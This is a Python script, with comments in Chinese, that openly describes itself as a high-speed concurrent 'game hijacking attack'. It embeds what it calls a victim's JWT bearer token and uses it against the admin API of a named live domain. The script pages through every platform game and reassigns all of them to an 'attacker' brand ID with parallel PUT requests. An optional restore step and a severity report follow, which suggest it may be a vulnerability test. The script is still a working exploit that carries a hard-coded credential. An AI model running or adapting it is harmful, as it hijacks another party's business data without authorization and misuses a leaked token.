import requests
import json
from datetime import datetime
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# 受害者資訊
VICTIM_TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL3dwYXBpLmxkanptci50b3AvYWRtaW4vbG9naW4iLCJpYXQiOjE3NzEwMDc0NTMsImV4cCI6MTgwMjU0MzQ1MywibmJmIjoxNzcxMDA3NDUzLCJqdGkiOiJIYzU4Y0Q4MkU0SGhGZzNpIiwic3ViIjoiMTEiLCJwcnYiOiI3MjM0OWFmZmRhMDQ0ZGMyYWQ3MGEzOWVmMTUxNjNlYTY3YTczMzEzIn0.eNJnEpERj775Cpk1jZjRNAmcxNvZFaaVK4HTIHjZu7A"

# 攻擊者的商戶
ATTACKER_BRAND_ID = 12

BASE_URL = "https://wpapi.ldjzmr.top"

headers = {
    "Authorization": f"Bearer {VICTIM_TOKEN}",
    "Content-Type": "application/json",
    "Accept": "application/json"
}

# 並發設定
MAX_WORKERS = 10  # 同時發送10個請求（更快！）

# 全局變數
backup_data = []
attack_results = []
lock = threading.Lock()

print("="*80)
print("🚨 高速批量遊戲劫持攻擊（並發版本）")
print("="*80)
print(f"攻擊時間: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
print(f"目標商戶 ID: {ATTACKER_BRAND_ID}")
print(f"並發數: {MAX_WORKERS} 個同時請求")
print("="*80 + "\n")

# ============================================================================
# 步驟 1: 獲取所有遊戲（支援分頁）
# ============================================================================
print("📍 步驟 1: 獲取所有遊戲（支援分頁）")
print("-"*80 + "\n")

all_games = []
page = 1
per_page = 100  # 每頁獲取100個

print("正在獲取遊戲列表...")

while True:
    print(f"  獲取第 {page} 頁...")
    
    response = requests.get(
        f"{BASE_URL}/admin/platform_game?pagenum={page}&pagesize={per_page}",
        headers=headers,
        timeout=30
    )
    
    if response.status_code != 200:
        print(f"  ✗ 獲取失敗，狀態碼: {response.status_code}")
        break
    
    data = response.json()
    
    if 'data' in data and 'data' in data['data']:
        games_on_page = data['data']['data']
        
        if len(games_on_page) == 0:
            print(f"  ✓ 已到達最後一頁")
            break
        
        all_games.extend(games_on_page)
        print(f"  ✓ 獲取了 {len(games_on_page)} 個遊戲（累計: {len(all_games)}）")
        
        # 檢查是否還有下一頁
        if 'last_page' in data['data']:
            if page >= data['data']['last_page']:
                print(f"  ✓ 已到達最後一頁（共 {page} 頁）")
                break
        
        page += 1
        time.sleep(0.2)  # 避免請求過快
    else:
        print("  ✗ 資料結構異常，停止獲取")
        break

print(f"\n✅ 總共獲取了 {len(all_games)} 個遊戲！\n")

if len(all_games) == 0:
    print("❌ 沒有找到任何遊戲，結束程序")
    exit(1)

# ============================================================================
# 步驟 2: 完整備份
# ============================================================================
print("📍 步驟 2: 完整備份")
print("-"*80 + "\n")

for game in all_games:
    backup_record = {
        "game_id": game['id'],
        "game_name": game.get('platform_game', {}).get('name', 'N/A'),
        "original_brand_id": game['brand_id'],
        "game_id_field": game['game_id'],
        "status": game['status'],
        "order": game['order'],
        "hot": game['hot'],
        "new": game['new'],
        "timestamp": datetime.now().isoformat()
    }
    backup_data.append(backup_record)

backup_filename = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
with open(backup_filename, 'w', encoding='utf-8') as f:
    json.dump(backup_data, f, ensure_ascii=False, indent=2)

print(f"✅ 備份完成！共 {len(backup_data)} 個遊戲")
print(f"✅ 備份檔案: {backup_filename}\n")

# ============================================================================
# 步驟 3: 高速並發攻擊
# ============================================================================
print("📍 步驟 3: 執行高速批量攻擊")
print("-"*80 + "\n")

print(f"⚠️  即將把 {len(all_games)} 個遊戲全部移到商戶 ID={ATTACKER_BRAND_ID}")
print(f"⚠️  使用 {MAX_WORKERS} 個並發連線，速度極快！")
print("\n確定要執行嗎？(yes/no): ", end='')
confirm = input()

if confirm.lower() != 'yes':
    print("\n❌ 攻擊已取消")
    exit(0)

print("\n🚀 開始高速批量攻擊...\n")

start_time = time.time()

def attack_single_game(game):
    """攻擊單個遊戲的函數"""
    game_id = game['id']
    game_name = game.get('platform_game', {}).get('name', 'N/A')
    original_brand = game['brand_id']
    
    attack_data = {
        "brand_id": ATTACKER_BRAND_ID,
        "game_id": game['game_id'],
        "status": game['status'],
        "order": game['order'],
        "hot": game['hot'],
        "new": game['new']
    }
    
    try:
        attack_response = requests.put(
            f"{BASE_URL}/admin/platform_game/{game_id}",
            headers=headers,
            json=attack_data,
            timeout=15
        )
        
        result_data = {
            "game_id": game_id,
            "game_name": game_name,
            "from_brand": original_brand,
            "to_brand": ATTACKER_BRAND_ID,
            "timestamp": datetime.now().isoformat()
        }
        
        if attack_response.status_code == 200:
            result = attack_response.json()
            if result.get('code') == 0:
                result_data["status"] = "success"
                with lock:
                    print(f"✓ [{len(attack_results)+1}/{len(all_games)}] ID={game_id:5} | {game_name[:30]}")
            else:
                result_data["status"] = "failed"
                result_data["error"] = result.get('msg')
                with lock:
                    print(f"✗ [{len(attack_results)+1}/{len(all_games)}] ID={game_id:5} | {result.get('msg')}")
        else:
            result_data["status"] = "http_error"
            result_data["error"] = f"HTTP {attack_response.status_code}"
            with lock:
                print(f"✗ [{len(attack_results)+1}/{len(all_games)}] ID={game_id:5} | HTTP {attack_response.status_code}")
        
        with lock:
            attack_results.append(result_data)
        
        return result_data
        
    except Exception as e:
        result_data = {
            "game_id": game_id,
            "status": "exception",
            "error": str(e)
        }
        with lock:
            attack_results.append(result_data)
            print(f"✗ [{len(attack_results)}/{len(all_games)}] ID={game_id:5} | 異常: {e}")
        return result_data

# 使用線程池並發執行
with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
    futures = [executor.submit(attack_single_game, game) for game in all_games]
    
    # 等待所有任務完成
    for future in as_completed(futures):
        pass  # 結果已在函數內處理

end_time = time.time()
elapsed_time = end_time - start_time

# ============================================================================
# 步驟 4: 攻擊結果統計
# ============================================================================
print("\n" + "="*80)
print("📍 步驟 4: 攻擊結果統計")
print("-"*80 + "\n")

success_count = sum(1 for r in attack_results if r.get('status') == 'success')
fail_count = len(attack_results) - success_count

print(f"總共攻擊: {len(all_games)} 個遊戲")
print(f"成功: {success_count} 個 ✓")
print(f"失敗: {fail_count} 個 ✗")
print(f"成功率: {(success_count/len(all_games)*100):.1f}%")
print(f"總耗時: {elapsed_time:.2f} 秒")
print(f"平均速度: {len(all_games)/elapsed_time:.2f} 個/秒")

# 保存攻擊日誌
log_filename = f"attack_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
with open(log_filename, 'w', encoding='utf-8') as f:
    json.dump(attack_results, f, ensure_ascii=False, indent=2)

print(f"\n✓ 攻擊日誌已保存: {log_filename}")

# ============================================================================
# 步驟 5: 恢復程序
# ============================================================================
print("\n" + "="*80)
print("📍 步驟 5: 恢復程序")
print("-"*80 + "\n")

print(f"發現 {len(backup_data)} 個遊戲的備份資料")
print("\n恢復選項:")
print("1. 立即全部恢復（高速並發）")
print("2. 稍後手動恢復")
print("3. 不恢復（保持攻擊狀態）")
print("\n請選擇 (1/2/3): ", end='')

restore_choice = input()

if restore_choice == '1':
    print("\n🚀 開始高速恢復...\n")
    
    restore_results = []
    restore_start = time.time()
    
    def restore_single_game(backup):
        """恢復單個遊戲"""
        game_id = backup['game_id']
        
        restore_data = {
            "brand_id": backup['original_brand_id'],
            "game_id": backup['game_id_field'],
            "status": backup['status'],
            "order": backup['order'],
            "hot": backup['hot'],
            "new": backup['new']
        }
        
        try:
            restore_response = requests.put(
                f"{BASE_URL}/admin/platform_game/{game_id}",
                headers=headers,
                json=restore_data,
                timeout=15
            )
            
            if restore_response.status_code == 200:
                result = restore_response.json()
                if result.get('code') == 0:
                    with lock:
                        print(f"✓ [{len(restore_results)+1}/{len(backup_data)}] 恢復成功 ID={game_id}")
                        restore_results.append({"game_id": game_id, "status": "success"})
                    return True
            
            with lock:
                print(f"✗ [{len(restore_results)+1}/{len(backup_data)}] 恢復失敗 ID={game_id}")
                restore_results.append({"game_id": game_id, "status": "failed"})
            return False
            
        except Exception as e:
            with lock:
                print(f"✗ [{len(restore_results)+1}/{len(backup_data)}] 異常 ID={game_id}: {e}")
                restore_results.append({"game_id": game_id, "status": "exception"})
            return False
    
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [executor.submit(restore_single_game, backup) for backup in backup_data]
        for future in as_completed(futures):
            pass
    
    restore_end = time.time()
    restore_time = restore_end - restore_start
    
    restore_success = sum(1 for r in restore_results if r.get('status') == 'success')
    
    print("\n" + "="*80)
    print("📊 恢復結果統計")
    print("-"*80)
    print(f"恢復成功: {restore_success} 個 ✓")
    print(f"恢復失敗: {len(restore_results) - restore_success} 個 ✗")
    print(f"成功率: {(restore_success/len(backup_data)*100):.1f}%")
    print(f"恢復耗時: {restore_time:.2f} 秒")
    
    if restore_success == len(backup_data):
        print("\n✅ 完美！所有遊戲已恢復到原始狀態")

elif restore_choice == '2':
    print(f"\n✓ 備份檔案已保存: {backup_filename}")

else:
    print(f"\n⚠️  遊戲保持在商戶 {ATTACKER_BRAND_ID}")

# ============================================================================
# 最終報告
# ============================================================================
print("\n" + "="*80)
print("📋 攻擊測試最終報告")
print("="*80)
print(f"""
攻擊統計:
  - 目標遊戲數: {len(all_games)}
  - 成功劫持: {success_count}
  - 失敗: {fail_count}
  - 成功率: {(success_count/len(all_games)*100):.1f}%
  - 總耗時: {elapsed_time:.2f} 秒
  - 攻擊速度: {len(all_games)/elapsed_time:.2f} 個/秒

性能提升:
  - 原速度（串行）: 約 {len(all_games)*0.5:.0f} 秒
  - 現速度（並發）: {elapsed_time:.2f} 秒
  - 提升: {(len(all_games)*0.5/elapsed_time):.1f}x 倍

備份檔案: {backup_filename}
日誌檔案: {log_filename}

⚠️ 安全漏洞嚴重性: 🔴 極高
  ✓ 可以在 {elapsed_time:.0f} 秒內清空所有遊戲
  ✓ 使用並發可以加速 10 倍以上
  ✓ 幾乎無法即時發現和阻止
""")

print("="*80)
print("測試完成！")
print("="*80)